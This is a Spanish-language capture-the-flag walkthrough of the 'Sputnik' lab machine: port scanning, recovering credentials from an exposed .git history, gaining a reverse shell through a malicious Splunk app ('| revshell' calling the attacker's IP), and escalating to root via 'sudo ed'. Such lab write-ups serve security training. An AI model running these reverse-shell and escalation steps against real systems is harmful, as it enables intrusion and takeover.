# Sputnik

Tags: [[_webExploitation]],[[_infoLeakage]],[[_sudoersAbusing]]

## Reconocimiento

arp-scan -I ens33 --localnet
Determino la IP de la máquina víctima.

Coloco la IP de la máquina víctima en un lugar visible, con
settarget "192.168.0.11 Sputnik" :    en usuario normal.

Hacer una traza ICMP para ver si la máquina está activa o no, con un ping.
Y con el ttl por defecto, puedo ver que es una máquina Linux (aunque se puede modificar).

Si está encendida, creamos los directorios de trabajo.

Una vez con eso, hay que empezar a hacer un reconocimiento de la máquina y sus puertos.
Con nmap:
nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 192.168.0.11 -oG allPorts
Con esto determino los puetos abiertos, para filtrar rápido por los mismos, y continuar con el escaneo.

Con una utilidad, filtro por los puertos.

Con los puertos ya a la mano, los escaneo.
Con nmap:
nmap -sC -sV -p8089,55555,61337 192.168.0.11 -oN targeted

En base a las versiones, trato de detectar el codename, para saber de qué SO se trata.
En launchpad, dice que es Ununtu Bionic.


## Enumeration

Parece que son págnias, o puertos abiertos para http.
Usaré whatweb para ver esos puertos.

+Un puerto da error.
(Ahorita vemos eso)
Ahora viendo bien, seguramente es por el certificado SSL. Pero no me dice que pueda continuar bajo mi riesgo.

+El otro parece que es del Flappy Bird. Así es.
Checamos el código fuente. Es solo el juego.
Antes de fuzzear por directorios, recursos, etc., sigamos viendo lo demás.

+El tercero trae muchas cosas. Me hace redirects.
Este me redirige a un panel de login.

La mayoría habla de splunk.
(Podría pensar en contraseñas por defecto)
Es una tecnología para monitorizar una red, para ver actividad inusual.

Viendo el código fuente del login panel. Pero nada en especial.

Probaremos las contraseñas por defecto. Pero en un principio no.
Algo está claro, hay que entrar dentro de ahí.

Sin embargo, como vamos a fuzzear la página, primero lo hacemos en la página donde está el Flappy.

Antes que nada.
En el mismo escaneo, se ve que hay un directorio en el Flappy.
Podríamos recomponer el proyecto de github, para en local ver todo.

----
<span style="color:#379075">https://github.com/arthaud/git-dumper</span>
Siempre que veamos un .git, hay que pensar en herramientas como esta.
<span style="color:#379075">Lo clonamos en el directorio de content.</span>
<span style="color:#379075">Hacemos primero:</span>
<span style="color:#379075">pip3 install -r requirements.txt :    para instalar los requerimientos de python. (Al final lo hice con pip normal).</span>
<span style="color:#379075">https://www.youtube.com/watch?v=5y_vJLf6oEA
Muy buen tuto para lo de las dependencias.
Me crea la carpeta dependencias en el directorio actual.</span>

<span style="color:#379075">Con el script:
python3 git_dumper.py http://192.168.0.11:55555/.git/ project</span>
<span style="color:#379075">Para traerlo al directorio actual.</span>


Otro script.
https://github.com/Ebryx/GitDump?tab=readme-ov-file 
git clone https://github.com/Ebryx/GitDump :    para clonarme el repositorio.
Seguí los pasos, y pude recomponer el proytecto. (Aunque estaba corrupto xd).

------

O al ver, en el directorio .git, el log y HEAD, hay un repositorio, lo habíamos visto ya de antes, nos podríamos clonar ese.

git clone https://github.com/ameerpornillos/flappy.git
Y es lo mismo que si lo recompusiéramos.^^

Del log donde se borró un archivo.
git ls-tree 5c5d8adcf57267bc0a936a7db21ddb90fcbcd9ca
Del commit new file.
Podemos ver que había un archivo secreto.
Le hacemos un show a su commit
git show 121cce9038070c86caa60707bc312d8a478d903f

Y obtenemos lo que parecen un usuario y contraseña.
Lo guardamos.

Probaríamos entrar por ssh, o por algún lado, si tuviera un servicio activo, pero no es el caso, entonces podríamos probar el el login panel que habíamos visto desde antes.
## Explotación Splunk

Viendo la página por dentro, veo que hay algo de Apps, y en HackTricks hay un RCE creando una Aplicación custom.

Si buscamos exploit splunk github
Aparece uno interesante.
https://github.com/TBGSecurity/splunk_shells
Entramos a los releases, descargamos el comprimido tar.gz
Y ese tenemos que subir como aplicación.

Una vez se sube, aparece junto a las demás hasta el final.
Configuramos los permisos para all apps..
Y con eso estaría de forma Global.

Y recordando que había un buscador, ahí es donde vamos a introducir código malicioso.

Nos ponemos en escucha:
nc -nlvp 445

Y en el buscador de la página: (como nos explica el github)
| revshell std 192.168.0.6 445
<span style="color:#379075">Nunca me funciona por el puerto 443 nada xd</span> 


Recibimos la reverse shell, y hacemos el tratamiento de la tty.
Por alguna razón no funciona. Así que nos enviamos una bash.
No tiene el parámetro -e de netcat, tiene un netcat antiguo.

Buscamos reverse shell monkey pentester.
Usamos la variante antigua.

Nos mandamos una bash (ahí sí se puede el puerto 443, curioso) y ya podemos hacer el tratamiento de la tty.

## Escalar prinvilegios

Una vez dentro, hay que investigar.
Verificar siempre qué usuario somos, y si estamos en la máquina objetvo.
Ver versiones de kernel.
uname -r
lsb_release -d :    -a también, con este comprobamos si nuestra conjetura era cierta, y en este caso sí, es Ubuntu Bionic.

Verificar con top.
Verificar con id.
Verificar sudo -l :    recorar siempresi tenía contraseñas que pueda reutilizar. Y ojo, en este caso sí se pudo.

Verificar usuarios.
usuario: kakeru
Entramos a su home. No hay cosas interesante.


Con el sudo -l y proporcionando la contraseña.
Podemos ejecutar un binario como el root. Porque tenemos privilegio asignado a nivel de sudoers.

Dicho binario, pues es un comando, hay que investigar qué es, qué hace, etc.
https://gtfobins.github.io/
Esta página contempla múltiples comandos.
El privilegio que tenemos es de (root).

Yo puedo hacer:
sudo ed :    no funciona si lo hago de forma relativa o absoluta.
Aunque no pase nada, se queda como en escucha, en la propia página nos dice que podemos poner:
!/bin/sh :    yo pongo bash

Y obtengo una bash como root.
